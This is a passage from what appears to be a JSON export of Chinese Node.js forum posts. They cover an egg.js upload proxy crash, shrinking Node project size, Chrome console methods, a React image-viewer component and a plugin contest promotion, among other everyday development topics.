this.ctx.render(&#x27;index.html&#x27;);\n  }\n\n  async proxy() {\n    const ctx = this.ctx;\n    &#x2F;&#x2F; use roadhog mock api first\n    const url = &#x27;http:&#x2F;&#x2F;127.0.0.1:8000&#x27; + ctx.path + &#x27;?&#x27; + ctx.querystring;\n\n    const res = await this.ctx.curl(url, {\n      method: this.ctx.method,\n    });\n    ctx.body = res.data;\n    ctx.status = res.status;\n  }\n}\n\nmodule.exports = HomeController;\n</code></pre><p>目前改成</p>\n<pre class=\"prettyprint\"><code>&#x27;use strict&#x27;;\n\nconst Controller = require(&#x27;egg&#x27;).Controller;\nconst FormStream = require(&#x27;formstream&#x27;);\nclass HomeController extends Controller {\n  async index() {\n    await this.ctx.render(&#x27;index.html&#x27;);\n  }\n\n  async proxy() {\n\n    const { ctx, config, logger } = this;\n    const { body, header } = ctx.request;\n    &#x2F;&#x2F; use roadhog mock api first\n    const url = &#96;${config.apiPath}${ctx.path}?${ctx.querystring}&#96;;\n    logger.info(&#96;${ctx.method} ${url}&#96;);\n\n    const proxyObj = {\n      method: ctx.method,\n    };\n    if (body) {\n      proxyObj.data = { ...body };\n    }\n    if (header) {\n      proxyObj.headers = { ...header };\n      if (header[&#x27;content-type&#x27;] &amp;&amp; header[&#x27;content-type&#x27;].indexOf(&#x27;multipart&#x27;) &gt;= 0) {\n        const stream = await ctx.getFileStream();\n        const form = new FormStream();\n        const { filename, mimeType, size } = stream;\n        form.stream(&#x27;file&#x27;, stream, filename, mimeType, size);\n        \n        proxyObj.stream = form;\n        proxyObj.headers = {\n          ...header,\n          ...form.headers(header),\n        };\n      }\n    }\n\n    const res = await this.ctx.curl(url, proxyObj);\n    if (res.status !== 204) {\n      ctx.body = res.data;\n    }\n    ctx.status = res.status;\n    logger.info(&#96;${ctx.method} ${url} ${res.status}&#96;);\n  }\n}\n\nmodule.exports = HomeController;\n</code></pre><p>文件上传服务器</p>\n<pre class=\"prettyprint\"><code>\nconst Controller = require(&#x27;egg&#x27;).Controller;\n\nclass UploadController extends Controller {\n  async img() {\n    const { ctx, service } = this;\n    console.log(&#x27;img stream before&#x27;);\n    const stream = await ctx.getFileStream();\n    const { qn } = service;\n\tconst { filename } = stream;\n    const res = await qn.upload(stream, filename);\n    ctx.helper.success({ ctx, res });\n  }\n}\n</code></pre><p>到 <code>const res = await qn.upload(stream, filename);</code> 这里就不行了。</p>\n<pre class=\"prettyprint\"><code>[2018-12-12 19:15:17.416] [cfork:master:11561] worker:11563 disconnect (exitedAfterDisconnect: true, state: disconnected, isDead: false, worker.disableRefork: false)\n[2018-12-12 19:15:17.416] [cfork:master:11561] don&#x27;t fork new work (refork: false)\n2018-12-12 19:15:17,416 INFO 11561 [master] app_worker#1:11563 disconnect, suicide: true, state: disconnected, current workers: [&quot;1&quot;]\n[Wed Dec 12 2018 19:15:47 GMT+0800 (CST)] [graceful:worker:11563] kill timeout, exit now.\n2018-12-12 19:15:47,405 ERROR 11563 [app_worker] exit with code:1\n[2018-12-12 19:15:47.411] [cfork:master:11561] worker:11563 exit (code: 1, exitedAfterDisconnect: true, state: dead, isDead: true, isExpected: true, worker.disableRefork: false)\n2018-12-12 19:15:47,412 ERROR 11561 nodejs.AppWorkerDiedError: [master] app_worker#1:11563 died (code: 1, signal: null, suicide: true, state: dead), current workers: []\n    at Master.onAppExit (&#x2F;Users&#x2F;thomas&#x2F;Documents&#x2F;projects&#x2F;u_login_api&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;master.js:398:21)\n    at Master.emit (events.js:180:13)\n    at Messenger.sendToMaster (&#x2F;Users&#x2F;thomas&#x2F;Documents&#x2F;projects&#x2F;u_login_api&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;utils&#x2F;messenger.js:133:17)\n    at Messenger.send (&#x2F;Users&#x2F;thomas&#x2F;Documents&#x2F;projects&#x2F;u_login_api&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;utils&#x2F;messenger.js:98:12)\n    at EventEmitter.cluster.on (&#x2F;Users&#x2F;thomas&#x2F;Documents&#x2F;projects&#x2F;u_login_api&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;master.js:267:22)\n    at EventEmitter.emit (events.js:185:15)\n    at ChildProcess.worker.process.once (internal&#x2F;cluster&#x2F;master.js:194:13)\n    at Object.onceWrapper (events.js:272:13)\n    at ChildProcess.emit (events.js:180:13)\n    at Process.ChildProcess._handle.onexit (internal&#x2F;child_process.js:209:12)\nname: &quot;AppWorkerDiedError&quot;\npid: 11561\n</code></pre><p><code>const res = await qn.upload(stream, filename);</code> 这里应该不是问题所在，因为在umi dev 的时候，直接到文件上传服务器是没有问题，可以正常上传到七牛云。</p>\n<p>请问问题是在哪里，这里 proxy 对文件流的处理是否正确？\n以上方法也是参考 <a href=\"https://eggjs.org/zh-cn/core/httpclient.html#%E4%BB%A5-multipart-%E6%96%B9%E5%BC%8F%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6\">egg官方文档 以-multipart-方式上传文件</a> 来做的。</p>\n</div>","title":"egg-ant-design-pro 的上传图片问题，proxy代理后七牛的上传把线程弄垮了？","last_reply_at":"2018-12-12T11:27:35.643Z","good":false,"top":false,"reply_count":2,"visit_count":808,"create_at":"2018-12-12T11:22:05.414Z","author":{"loginname":"thomas0836","avatar_url":"https://avatars2.githubusercontent.com/u/3435615?v=4&s=120"}},{"id":"5c0e991ff3d48d2397c0fc94","author_id":"5b376dfcac8bc1e124114500","tab":"share","content":"<div class=\"markdown-text\"><p>很多刚刚入门的同学都被 node 项目体积给吓到，拉几个依赖包包项目立马 上百个 MB。\n往往你<strong>只需要一个轮子</strong>的时候 npm 给你拉了 <strong>“一辆马车”(一大坨依赖包)</strong></p>\n<p>但这个缺点可以解决！</p>\n<p>现在大多数依赖包现在都模块化了 打个比方 lodash:</p>\n<pre class=\"prettyprint language- javascript\"><code>&#x2F;&#x2F; Load the full build.\nvar _ = require(&#x27;lodash&#x27;);\n&#x2F;&#x2F; Load the core build.\nvar _ = require(&#x27;lodash&#x2F;core&#x27;);\n&#x2F;&#x2F; Load the FP build for immutable auto-curried iteratee-first data-last methods.\nvar fp = require(&#x27;lodash&#x2F;fp&#x27;);\n \n&#x2F;&#x2F; Load method categories.\nvar array = require(&#x27;lodash&#x2F;array&#x27;);\nvar object = require(&#x27;lodash&#x2F;fp&#x2F;object&#x27;);\n</code></pre><h2>解决方案1:</h2>\n<p>用 webpack 打包！具体思路就是 把 lodash 这样可以打包的库加到 devDependency，把不能打包的 mysql2 这样的库添加到 dependency 里。最后在 webpack 打包的时候和他说忽略 dependency 里这些不能的库。</p>\n<p>现在把你打包好的 项目（index.js）和 package.json 上传到服务器。服务器只会安装 package.json dependency 的库。体积最少可以减 50%。</p>\n<p>webpack config.json</p>\n<pre class=\"prettyprint language- javascript\"><code>const nodeExternals = require(&#x27;webpack-node-externals&#x27;);\ncommonConfig = {\n  ... &#x2F;&#x2F; 其他代码\n  target: &#x27;node&#x27;, &#x2F;&#x2F; in order to ignore built-in modules like path, fs, etc.\n  externals: [nodeExternals()], &#x2F;&#x2F; 忽略在 package.json dependency 的模块\n};\nmodule.exports = commonConfig;\n</code></pre><p>package.json</p>\n<pre class=\"prettyprint language- javascript\"><code>{\n  &quot;devDependencies&quot;: {\n    &#x2F;&#x2F; 可以打包的依赖包\n    lodash\n  },\n  &quot;dependencies&quot;: {\n    &#x2F;&#x2F; 不 可以打包的依赖包\n    mysql2\n  },\n}\n\n</code></pre><h2>解决方案2:</h2>\n<p>用比如 <a href=\"https://github.com/zeit/ncc\">zeit/ncc</a> 这些node 打包📦工具</p>\n<h2>有更多的方法欢迎留言!</h2>\n<blockquote>\n<p><a href=\"https://tmirun.github.io/blog/Node-%E9%A1%B9%E7%9B%AE%E7%98%A6%E8%BA%AB/\">原文: Node-项目瘦身</a></p>\n</blockquote>\n</div>","title":"让你的 Node 项目瘦身","last_reply_at":"2018-12-12T10:59:00.170Z","good":false,"top":false,"reply_count":12,"visit_count":1250,"create_at":"2018-12-10T16:49:35.420Z","author":{"loginname":"tmirun","avatar_url":"https://avatars1.githubusercontent.com/u/8052536?v=4&s=120"}},{"id":"5c0f5d08f3d48d2397c1000a","author_id":"5c0f5bc5f3d48d2397c10003","tab":"ask","content":"<div class=\"markdown-text\"><p>node 在使用 grpc，\n服务端\ntry {\ncallback(null, { data: data })\n}catch(err) {\nlet obj = new Error(‘error’);\nobj.code = 'failed’\ncallback(err, { data: data })\n}\n为啥在客户端接收异常，不对应呀，999999</p>\n</div>","title":"node grpc callback 参数问题","last_reply_at":"2018-12-12T08:11:48.260Z","good":false,"top":false,"reply_count":1,"visit_count":639,"create_at":"2018-12-11T06:45:28.842Z","author":{"loginname":"15537839367","avatar_url":"https://avatars1.githubusercontent.com/u/29532906?v=4&s=120"}},{"id":"5c10ba97f3d48d2397c10674","author_id":"54475fdf649ac9220757b8ed","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p><a href=\"https://studio.dev.tencent.com/\">Cloud Studio</a> 为开发者提供了最极客的开发体验，包括完整的 Linux 环境, 自定义域名指向, 分享开发环境, 动态计算资源调整等，助你轻松完成各种应用的开发编译与部署。为丰富 Cloud Studio 插件的市场生态，为开发者带来更多的便利，CODING 联合腾讯云举办了 <a href=\"https://studio.qcloud.coding.net/campaign/favorite-plugins/\">“我最喜爱的 Cloud Stuido 插件评选大赛”</a>, 提交插件、评价插件或是分享页面均有机会赢取丰厚礼品 <strong>（只要提交插件即可获得 50 元话费奖励）</strong> ，Cloud Studio 插件市场支持提交 14 种插件类型，在每类插件中总分排名前 5 的选手中，由特约评审评选出 1 名最佳优胜者，奖品为 iPhone XS、MacBook Pro 及戴尔显示器 。其他 4 人获得最高人气奖， 奖品为 500 元京东卡。 在此次大赛中，我们邀请到了包括尤雨溪，芋头（小芋头君），迷渡（ justjavac ），黄峰达（ Phodal ）等业界大牛参与插件的评选，共同等待优秀的你！</p>\n</blockquote>\n<p><a href=\"https://studio.qcloud.coding.net/campaign/favorite-plugins/\">“我最喜爱的 Cloud Studio 插件评选大赛”</a> 目前已经得到了来自全国各地开发者提交的 120 多个插件，其中包括：</p>\n<h4>Code Runner</h4>\n<p>安装： <a href=\"https://studio.qcloud.coding.net/plugins/detail/348\">https://studio.qcloud.coding.net/plugins/detail/348</a></p>\n<p>源码： <a href=\"https://dev.tencent.com/u/formulahendry/p/CloudStudio-Code-Runner/git\">https://dev.tencent.com/u/formulahendry/p/CloudStudio-Code-Runner/git</a></p>\n<p>介绍：VS Code 拥有 400 万下载量的 Code Runner 来到 Cloud Studio 了！快速运行你的代码，支持 JavaScript, Python, PHP, Ruby, Go, Perl, Lua, Groovy 等</p>\n<p><img src=\"https://dn-coding-net-production-pp.codehub.cn/c1e9ace0-cc63-4253-817b-bccbb75286fb.png\" alt=\"图片\"></p>\n<hr>\n<h4>quick-query</h4>\n<p>安装： <a href=\"https://studio.qcloud.coding.net/plugins/detail/473\">https://studio.qcloud.coding.net/plugins/detail/473</a></p>\n<p>源码： <a href=\"https://dev.tencent.com/u/luke93/p/quick-query/git\">https://dev.tencent.com/u/luke93/p/quick-query/git</a></p>\n<p>介绍：Qucik Query 帮助开发者快速查询编程时遇到的问题，省去打开搜索页面，复制粘贴问题的繁琐步骤</p>\n<p><img src=\"https://dn-coding-net-production-pp.codehub.cn/52fe0b35-e775-409d-a1de-95248a9ade1b.gif\" alt=\"图片\"></p>\n<hr>\n<h4>版本分支图</h4>\n<p>安装： <a href=\"https://studio.qcloud.coding.net/plugins/detail/567\">https://studio.qcloud.coding.net/plugins/detail/567</a></p>\n<p>源码： <a href=\"https://dev.tencent.com/u/wantflying/p/revision-graphs/git\">https://dev.tencent.com/u/wantflying/p/revision-graphs/git</a></p>\n<p>介绍：查看当前项目的 git 分支、标签结构，使用分支比较多，或者比较严格的 git 开发模式的情况下非常好用。</p>\n<p><img src=\"https://dn-coding-net-production-pp.codehub.cn/8521e6e1-c3cb-420e-a8b7-79fbc971282a.gif\" alt=\"图片\"></p>\n<hr>\n<h4>One For All</h4>\n<p>安装： <a href=\"https://studio.qcloud.coding.net/plugins/detail/493\">https://studio.qcloud.coding.net/plugins/detail/493</a></p>\n<p>源码： <a href=\"https://dev.tencent.com/u/wowlusitong/p/one-for-all/git\">https://dev.tencent.com/u/wowlusitong/p/one-for-all/git</a></p>\n<p>介绍：高度可定制化代码片段，只要你想，就可以支持任何语言，任何框架，任何片段</p>\n<p><img src=\"https://dn-coding-net-production-pp.codehub.cn/34885f05-1d6e-46c3-8dcc-e4c1553b8ad8.png\" alt=\"图片\"></p>\n<hr>\n<h4>时间统计</h4>\n<p>安装：hhttps://studio.qcloud.coding.net/plugins/detail/604</p>\n<p>源码： <a href=\"https://dev.tencent.com/u/glzjin2018/p/Focus-Please/git\">https://dev.tencent.com/u/glzjin2018/p/Focus-Please/git</a></p>\n<p>介绍：统计您一天工作了多久，还有摸鱼了多少次。</p>\n<p><img src=\"https://dn-coding-net-production-pp.codehub.cn/b467a48d-9dfc-4b6f-b803-a7b6faa3d267.png\" alt=\"图片\"></p>\n<hr>\n<h4>还有更多插件请 <a href=\"https://studio.dev.tencent.com/plugins/list?type=-1&amp;sort=sumScore&amp;page=1\">点击这里</a> 浏览。</h4>\n<p>附送彩蛋一颗（可微信扫码发现你的二次元属性；）</p>\n<p><img src=\"https://dn-coding-net-production-pp.codehub.cn/bfe2fc24-997f-459f-8add-e1e543331691.jpeg?imageView2/2/w/600\" alt=\"图片\"></p>\n<blockquote>\n<p>Cloud Studio 是基于 <a href=\"https://microsoft.github.io/monaco-editor/\">Monaco-Editor</a> 以及 React 的在线 IDE （集成式开发环境）。它自带多种编程语言及运行环境支持，让开发者可以随时随地打开浏览器编写代码并运行代码。同时 Cloud Studio 开放了丰富的插件扩展系统，得益于 Monaco-Editor 强大的扩展性，用户可以自行开发插件来提升使用体验。你可以 <a href=\"https://studio.dev.tencent.com/plugins-docs/\">点击此处</a> 查看插件提交教程。</p>\n</blockquote>\n<blockquote>\n<p>考虑到部分开发者困于创意阶段，我们也欢迎开发者学习和参考 <a href=\"https://atom.io/packages\">Atom</a>, <a href=\"https://marketplace.visualstudio.com/\">VS</a> 等开发工具的插件创意并移植到 Cloud Studio。</p>\n</blockquote>\n<p>还等什么，快来 <a href=\"https://studio.qcloud.coding.net/campaign/favorite-plugins/\">提交插件</a> 领取属于你的 Macbook Pro 吧！分享至朋友圈还可以获赠 <a href=\"https://studio.qcloud.coding.net/campaign/favorite-plugins/\">20 元话费奖励</a> 哦；）</p>\n</div>","title":"Cloud Studio 优秀插件请你来 Review | 分享送话费","last_reply_at":"2018-12-12T07:36:55.872Z","good":false,"top":false,"reply_count":0,"visit_count":571,"create_at":"2018-12-12T07:36:55.872Z","author":{"loginname":"zengliqi","avatar_url":"https://avatars1.githubusercontent.com/u/9347370?v=4&s=120"}},{"id":"5c0fb5bd7ec239239ff55dbc","author_id":"58d866b86f8b9bf02d1d0b20","tab":"share","content":"<div class=\"markdown-text\"><ol>\n<li>\n<p>assert 断言\nconsole.assert(false, ‘hi’)\n第一个参数为false 的时候 报错， 这个和node 的一样，\n其实也就等价于, 我是不用，\nif(false) console.error(‘e’)</p>\n</li>\n<li>\n<p>clear 清空\nconsole.error() 清空控制台输出的日志 (里面加参数也不报错，就是没什么用)</p>\n</li>\n<li>\n<p>count 计数\nconsole.count(‘a’) 输出 a:1\n统计某个函数被调用次数 ，或者统计一段文本里面某个词的频率， 但是好像不能拿到计数的值，所以，这个计数 值我存不起来</p>\n</li>\n<li>\n<p>countReset 重置计数\nconsole.countReset(‘a’)</p>\n</li>\n<li>\n<p>debug 调试\n讲道理 我不喜欢调试， 而且即使是前端调试，直接在控制台操作就好， 这个我不会用, 还是境界太低</p>\n</li>\n<li>\n<p>dir 打印该对象所有的属性方法\n多数情况下好像和log 区别不大， 我只在打印 dom 节点的时候 发现区别， 他会打印该dom 拥有的所有方法 ， 而log 只会打印出 比如 &lt;div&gt;&lt;/div&gt;</p>\n</li>\n<li>\n<p>dirxml\n应该是 打印xml 格式的对象。 俺不清楚。 对xml 不熟</p>\n</li>\n<li>\n<p>error 错误日志\n会显示x号， 颜色红色</p>\n</li>\n<li>\n<p>group 分组\n日志分组，这个就有点意思了， （但是我最后都喜欢删日志）</p>\n</li>\n</ol>\n<pre class=\"prettyprint\"><code>console.group(&#x27;first&#x27;)\n    console.group(&#x27;second&#x27;)\n        console.log(&#x27;hi, hello&#x27;)\n        console.log(&#x27;hi, hello&#x27;)\n    console.groupEnd(&#x27;second&#x27;)\nconsole.groupEnd(&#x27;first&#x27;)\n</code></pre><p>会打印出有层级结构的日志， 还能折叠，其实对调试很有帮助， 每个函数分个组， 也是美滋滋， 就是默认控制台输出是打开状态，</p>\n<ol>\n<li>\n<p>groupCollapsed 分组\n唯一和上面不同的就是 默认是闭合的， 我喜欢这种 讲道理</p>\n</li>\n<li>\n<p>groupEnd 结束分组\n就是标志分组界限的，闭合标签</p>\n</li>\n<li>\n<p>info\n提示信息， 我觉得和log 没区别</p>\n</li>\n<li>\n<p>log\n支持提示符</p>\n</li>\n</ol>\n<pre class=\"prettyprint\"><code>console.log(&quot;%c内容&quot;, &quot;font-size:20px; color:red;&quot;); &#x2F;&#x2F;输出内容拥有样\nconsole.log(&#x27;a=%i&#x27;, 1.32); &#x2F;&#x2F; 结果 a=1\n</code></pre><p>我就觉得 %c 和%i或%d 有用， 其他的都觉得没啥用， 比如 %s %o %O 等, 不过 谁学c 的时候 不是这么输出的呢</p>\n<ol>\n<li>\n<p>profile 性能测试\n我一直没用过的， 境界太低， 不需要</p>\n</li>\n<li>\n<p>profileEnd 结束测试</p>\n</li>\n<li>\n<p>table 表格\n打印出表格，\nconsole.table({a:1, b:2})\n┌─────────┬────────┐\n│ (index) │ Values │\n├─────────┼────────┤\n│    a    │   1    │\n│    b    │   2    │\n└─────────┴────────┘\nnode 10 也支持这个功能了，  我觉得打印对象 看起来爽</p>\n</li>\n<li>\n<p>time 计时器\n统计时间的， 我测函数执行时间经常用 和 timeEnd 成对\nconsole.time(‘start’)\nwhile(1)\nconsole.timeEnd(‘start’)</p>\n</li>\n<li>\n<p>timeEnd 结束定时器，</p>\n</li>\n<li>\n<p>timeStamp 时间轴\ntimeline 里面会有标记</p>\n</li>\n<li>\n<p>trace 当前执行的代码在堆栈中的调用路径。</p>\n</li>\n<li>\n<p>warn 警告 有感叹号，</p>\n</li>\n<li>\n<p>memory 属性\n显示内存信息</p>\n</li>\n</ol>\n</div>","title":"Chrome 之console","last_reply_at":"2018-12-12T02:26:00.146Z","good":false,"top":false,"reply_count":1,"visit_count":690,"create_at":"2018-12-11T13:03:57.539Z","author":{"loginname":"wjiban","avatar_url":"https://avatars3.githubusercontent.com/u/23730727?v=4&s=120"}},{"id":"5c0f9471f3d48d2397c10208","author_id":"56ac4d7f26d02fc6626bb3b1","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint\"><code>this.state = {\n      pOM: props.pOM, &#x2F;&#x2F; the return message of backend, as code is error\n      isOpen: false\n }\n&lt;Popup open={this.state.isOpen} trigger={&lt;Button className=&#x27;btn-gre&#x27;&gt;buy&lt;&#x2F;Button&gt;} on=&#x27;click&#x27; content={this.state.pOM} hideOnScroll &#x2F;&gt;\n</code></pre><p>当点击buy这个按钮的时候，会向服务端发起请求，会返回成功或者错误信息，然后popup显示出来；现在遇到的问题是当第一次点击显示信息A，当再点击的时候，服务端返回信息B,但是popup会把之前的信息A重新显示一次，再显示信息B，初步判断是state没有更新，所以用setTimeout来延时显示，但是不太完美，想问下还有别的解决办法吗？</p>\n</div>","title":"问大家一个react semantic-ui-react Popup trigger的问题","last_reply_at":"2018-12-11T10:41:53.341Z","good":false,"top":false,"reply_count":0,"visit_count":578,"create_at":"2018-12-11T10:41:53.341Z","author":{"loginname":"oyosc","avatar_url":"https://avatars1.githubusercontent.com/u/13896491?v=4&s=120"}},{"id":"5c0f8150f3d48d2397c10175","author_id":"580339330bab808265185e45","tab":"share","content":"<div class=\"markdown-text\"><p>cxj-react-image 用法如下：</p>\n<pre class=\"prettyprint\"><code>yarn add cxj-react-image\n&#x2F;&#x2F; npm i cxj-react-image\n</code></pre><pre class=\"prettyprint\"><code>import ImageModal from &#x27;cxj-react-image&#x27;;\n\n&lt;ImageModal \n  src={imageList[currentImageIndex]}  {&#x2F;* 当前图片路径 *&#x2F;}\n  next={() =&gt; this.next()}            {&#x2F;* 控制下一张 *&#x2F;}\n  prev={() =&gt; this.prev()}            {&#x2F;* 控制上一张 *&#x2F;}\n  closeModal={() =&gt; this.closeImg()}  {&#x2F;* 控制modal打开关闭 *&#x2F;}\n  option={{\n    move: true,                        {&#x2F;* 控制拖动 *&#x2F;}\n    waterMarkText: &#x27;多功能图片组件&#x27;,    {&#x2F;* 设置水印文字 *&#x2F;}\n    rotate: true,                      {&#x2F;* 控制旋转 *&#x2F;}\n    zoom: true                         {&#x2F;* 控制放大缩小 *&#x2F;}\n  }}\n&#x2F;&gt;\n</code></pre><p>更详细的用法请参考 <code>container.js</code>文件</p>\n<p><a href=\"https://github.com/wtfjun/cxjReactImage\">github地址</a></p>\n<p><a href=\"https://wtfjun.github.io/cxjReactImage/build/\">在线例子</a></p>\n<p>&lt;i&gt;如有帮助，感谢star~~~ 如有问题，欢迎call me~~~&lt;/i&gt;</p>\n<p>交流请加wx: c13266836563</p>\n<p>&lt;hr /&gt;\n&lt;hr /&gt;\n&lt;hr /&gt;</p>\n<p>以下为相关实现讲解</p>\n<h4>拖拽</h4>\n<p>实现拖拽的思路是计算出dom最后的left跟top。</p>\n<p>未移动前可以通过clientX跟offsetLeft拿到dom的x坐标和左边距，记为<code>initX和offLeft</code>。</p>\n<p>移动的过程中可以通过<code>clientX</code>拿到元素的x坐标，记为<code>moveX</code>。</p>\n<p>得到公式：<code>left = moveX - initX + offLeft</code>。</p>\n<p>核心代码如下：</p>\n<pre class=\"prettyprint\"><code>const move = (dv) =&gt; {\n  &#x2F;&#x2F; 获取元素\n  let x = 0;\n  let y = 0;\n  let l = 0;\n  let t = 0;\n  let isDown = false;\n  &#x2F;&#x2F; 鼠标按下事件\n  dv.onmousedown = function(e) {\n    &#x2F;&#x2F; 获取x坐标和y坐标\n    x = e.clientX;\n    y = e.clientY;\n\n    &#x2F;&#x2F; 获取左部和顶部的偏移量\n    l = dv.offsetLeft;\n    t = dv.offsetTop;\n  \n    handleMove();\n  };\n  &#x2F;&#x2F; 鼠标移动\n  &#x2F;&#x2F; 再包一层是为了方便注册 避免被替换\n  function handleMove() {\n    onmousemove = function(e) { \n      &#x2F;&#x2F; 获取x和y\n      let nx = e.clientX;\n      let ny = e.clientY;\n\n      &#x2F;&#x2F; 计算移动后的左偏移量和顶部的偏移量\n      let nl = nx - (x - l);\n      let nt = ny - (y - t);\n\n      dv.style.left = nl + &#x27;px&#x27;;\n      dv.style.top = nt + &#x27;px&#x27;;\n    };\n  }\n};\n</code></pre><p>关于拖拽，有个情况还需要优化：页面上有两个modal，要保证最后点击的modal要覆盖之前点击的modal。</p>\n<p>也就是zIndex要控制好，这里用localStorage来保存这个最大的zIndex</p>\n<pre class=\"prettyprint\"><code>imageModalMaxzIndex = localStorage.getItem(&#x27;imageModalMaxzIndex&#x27;);\nif (dv.style.zIndex != imageModalMaxzIndex) {\n  dv.style.zIndex = +imageModalMaxzIndex + 1;\n  localStorage.setItem(&#x27;imageModalMaxzIndex&#x27;, dv.style.zIndex);\n}\n</code></pre><p>&lt;hr /&gt;</p>\n<h4>水印</h4>\n<p>前端实现水印，避免私密图片泄露</p>\n<p>思路是使用canvas生成文字图片，然后利用以下的css：</p>\n<p><code>background-image:url('${base64Url}');</code></p>\n<p><code>background-repeat:repeat;</code></p>\n<p>实现水印类：</p>\n<pre class=\"prettyprint\"><code>&#x2F;**\n * @overview: 水印组件\n *&#x2F;\n\nexport default class WaterMark {\n  constructor(container, option) {\n    this.container = container;\n    this.option = {\n      width: &#x27;200px&#x27;,\n      height: &#x27;150px&#x27;,\n      opacity: .7,\n      fillStyle: &#x27;rgba(47, 205, 227, 0.3)&#x27;,\n      font: &#x27;20px microsoft yahei&#x27;,\n      textBaseline: &#x27;middle&#x27;,\n      textAlign: &#x27;center&#x27;,\n      fillText: &#x27;水印&#x27;,\n      ...option\n    };\n  }\n    \n  draw() {\n    const { \n      container, \n      option: {\n        width,\n        height,\n        opacity,\n        fillStyle,\n        font,\n        textBaseline,\n        textAlign,\n        fillText,\n        scrollHeight\n      } \n    } = this;\n    const canvas = document.createElement(&#x27;canvas&#x27;);\n    canvas.setAttribute(&#x27;width&#x27;, width);\n    canvas.setAttribute(&#x27;height&#x27;, height);\n    canvas.setAttribute(&#x27;opacity&#x27;, opacity);\n    const ctx = canvas.getContext(&#x27;2d&#x27;);\n  \n    ctx.textAlign = textAlign;\n    ctx.textBaseline = textBaseline;\n    ctx.font = font;\n    ctx.fillStyle = fillStyle;\n    ctx.rotate(Math.PI &#x2F; 180 * 30);\n    ctx.fillText(fillText, 80, 10);\n        \n    var base64Url = canvas.toDataURL();\n    const watermarkDiv = document.createElement(&#x27;div&#x27;);\n    watermarkDiv.setAttribute(&#x27;style&#x27;, &#96;\n          position:absolute;\n          top:0;\n          left:0;\n          width:100%;\n          height:${scrollHeight || &#x27;100%&#x27;};\n          z-index:1000;\n          pointer-events:none;\n          background-repeat:repeat;\n          background-image:url(&#x27;${base64Url}&#x27;)&#96;);\n  \n    if (typeof container === &#x27;object&#x27;) {\n      container.style.position = &#x27;relative&#x27;;\n      container.insertBefore(watermarkDiv, container.firstChild);\n    }\n  }\n}\n</code></pre><p>这里有一篇文章总结了几种前端水印的方案，推荐给大家 <a href=\"https://juejin.im/post/5b61a273e51d45349e11aba8\">文章</a></p>\n<p>&lt;hr /&gt;</p>\n<h4>缩放</h4>\n<p>缩放的话，监听鼠标滚动事件。向上滚动放大，向下滚动缩小；这里要注意控制最小缩放值。</p>\n<p>还要注意的是图片在边界的缩放，不然图片可能会移动在屏幕外。</p>\n<p>需要做的处理是判断左边界跟图片的宽度。</p>\n<p>代码实现：</p>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F; 控制滚轮缩放\n\nconst zoom = (onWheelEvent, dom) =&gt; {\n  let e = onWheelEvent;\n  let imageModalWidth = parseInt(dom.style.width);\n  let modalLeft = parseInt(dom.style.left);\n      \n  &#x2F;&#x2F; 计算缩放后的大小 每一次滚轮 100px\n  let calcWidth = imageModalWidth - e.deltaY;                 \n      \n  &#x2F;&#x2F; 限制最小 width = 400\n  if (calcWidth &lt;= 300) {\n    return;\n  }\n    \n  &#x2F;&#x2F; 不让modal由于缩小消失在视野中\n  if (modalLeft + calcWidth &lt; 50) {\n    return;\n  }\n      \n  dom.style.width = &#96;${calcWidth}px&#96;;\n};\n</code></pre></div>","title":"多功能React影像组件设计(拖拽、水印、缩放、切换、旋转)","last_reply_at":"2018-12-11T09:20:16.762Z","good":false,"top":false,"reply_count":0,"visit_count":648,"create_at":"2018-12-11T09:20:16.762Z","author":{"loginname":"wtfjun","avatar_url":"https://avatars1.githubusercontent.com/u/17716658?v=4&s=120"}},{"id":"5c0f791d7ec239239ff55c34","author_id":"5b03c9a7000332b81cf821a5","tab":"ask","content":"<div class=\"markdown-text\"><p>按照教程配置私有域名跳转至git博客页面，但是怎么都跳不过去，一直404.下面是我的配置截图。\n<img src=\"//static.cnodejs.org/FizhQffpe432eoM7itz5uxkG_Kwp\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/FvNBPoS1wzDqWRq7sNZtUTv7G4tI\" alt=\"image.png\"></p>\n</div>","title":"阿里云域名跳转不到git博客页面","last_reply_at":"2018-12-11T09:18:34.834Z","good":false,"top":false,"reply_count":1,"visit_count":615,"create_at":"2018-12-11T08:45:17.032Z","author":{"loginname":"linxiaoziruo","avatar_url":"https://avatars3.githubusercontent.com/u/6881273?v=4&s=120"}},{"id":"5c0f2c197ec239239ff55945","author_id":"56f3854c0a5a2cfb3ad149e2","tab":"share","content":"<div class=\"markdown-text\"><p>在开发调试web页面过程中，经常会被浏览器缓存所困扰，导致一些静态资源的请求无法得到实时更新，特别是手机APP的内嵌Webview页面，经常找不到清除缓存的入口，本文将介绍下如何利用whistle彻底解决这类问题。</p>\n<blockquote>\n<p>whistle是基于Node实现的跨平台web调试代理工具，功能强大，基本上覆盖了调试代理工具可以做的任何事情，所有操作都可以通过配置实现，且支持插件扩展，具体功能参见Github：<a href=\"https://github.com/avwo/whistle\">https://github.com/avwo/whistle</a></p>\n</blockquote>\n<p>一般清除缓存可以用以下三种方式：</p>\n<ol>\n<li>客户端(浏览器)禁用缓存</li>\n<li>通过修改请求和响应头</li>\n<li>通过给请求URL加随机参数</li>\n</ol>\n<h4>客户端禁用缓存</h4>\n<p>Chrome浏览器可以通过打开开发者工具，并勾选Network菜单里面的<code>Disable cache</code> 实现禁用当前页面的缓存：\n<img src=\"https://user-images.githubusercontent.com/11450939/49774113-a302e900-fd2e-11e8-9781-14a842739801.png\" alt=\"禁用Chrome浏览器缓存\">\n<em>注意：勾选后开发者工具也要一直保持打开状态，否则没有效果</em></p>\n<p>这种方式只有Chrome和Firefox等一些浏览器支持，大多数普通客户端和手机APP里面的WebView不支持，更通用的方式是利用调试代理工具实现后面的两种方式。</p>\n<h4>修改请求和响应头</h4>\n<p>修改请求头是通过删除及设置一些缓存相关的字段，包括：</p>\n<ol>\n<li>删除 <code>If-Modified-Since</code></li>\n<li>删除 <code>Last-Modified</code></li>\n<li>删除 <code>Etag</code></li>\n<li>设置 <code>Pragma=no-cache</code></li>\n<li>设置 